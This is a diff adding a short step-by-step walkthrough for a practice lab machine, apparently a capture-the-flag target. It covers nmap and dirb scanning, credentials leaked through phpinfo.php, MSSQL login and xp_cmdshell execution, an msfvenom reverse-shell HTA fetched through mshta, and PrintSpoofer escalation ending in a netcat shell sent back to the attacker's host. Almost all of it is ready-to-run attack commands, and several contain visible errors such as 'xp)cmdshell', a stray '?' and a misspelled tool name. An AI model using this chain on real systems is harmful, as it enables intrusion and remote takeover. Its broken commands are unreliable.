@@ -1,0 +1,19 @@
+101 MACHINE 
+
+1)Scan nmap > sudo nmap -sS -sC -sV -T5 192.168.xx.101 -Pn
+2)Enumarete with dirb dirb http://192.168.xx.101
+3)You will see phpinfo.php directory 
+4)When open  this directory you will see  auth user and auth password > user: sa password: D@t@b@535
+5) You can connect with impacket-mssqlclient > impacket-mssqlclient sa:'D@t@b@535'@192.168.xx.101
+6)You can use EXEC master .. xp)cmdshell 'whoami'
+7)Create reverse shell > msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f hta ? shell.hta
+8)Run python3 -m http.server 80 , Run hta shell with impacket-mssclient > EXEC master .. xp_cmdshell 'mshta http://192.168.xx.101/shell.hta'
+9)You will take reverse shell with nc
+
+
+Root Steps:
+
+1) Upload in target machine nc.exe and PrintSpoofer.exe 
+2) PrintSpoofer.exe -c "c:\windows\temp\nc.64.exe 192.168.xx.xx 4545 -e cmd"
+3) YOu can take root shell from 4545
+
